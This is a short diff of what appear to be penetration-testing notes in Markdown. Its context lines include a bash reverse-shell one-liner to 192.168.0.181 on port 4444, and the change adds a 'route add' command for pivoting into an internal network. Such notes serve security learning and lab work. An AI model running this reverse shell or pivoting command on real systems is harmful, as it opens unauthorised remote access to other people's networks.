@@ -155,7 +155,10 @@ run
 sh -i >& /dev/tcp/192.168.0.181/4444 0>&1
 ```
 
-
+route add
+```python
+route add 10.0.2.4 255.255.255.0 2
+```
 
 pivoting by portforgarding 
 ```python
